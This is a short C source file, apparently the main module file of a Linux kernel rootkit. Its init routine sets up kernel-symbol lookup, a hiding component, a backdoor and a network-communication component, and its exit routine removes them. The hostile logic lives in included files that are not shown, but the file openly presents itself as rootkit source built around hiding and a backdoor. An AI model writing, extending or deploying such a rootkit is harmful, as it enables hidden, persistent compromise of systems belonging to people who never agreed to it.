#include <linux/module.h>
#include <linux/kernel.h>
#include "ksym.h"
#include "backdoor.h"
#include "hide.h"
#include "netcom.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Lain");
MODULE_DESCRIPTION("Hidden Layer of the Wired");
MODULE_VERSION("1.0");

static int __init rootkit_init(void) {
    int err;
    pr_info("rootkit: loading...\n");

    err = ksym_init();
    if (err) return err;

    err = init_hide();
    if (err) goto out_ksym;

    err = init_backdoor();
    if (err) goto out_hide;

    err = init_netcom();
    if (err) goto out_backdoor;

    pr_info("rootkit: loaded successfully\n");
    return 0;

out_backdoor:
    cleanup_backdoor();
out_hide:
    cleanup_hide();
out_ksym:
    ksym_cleanup();
    return err;
}

static void __exit rootkit_exit(void) {
    cleanup_netcom();
    cleanup_backdoor();
    cleanup_hide();
    ksym_cleanup();
    pr_info("rootkit: unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
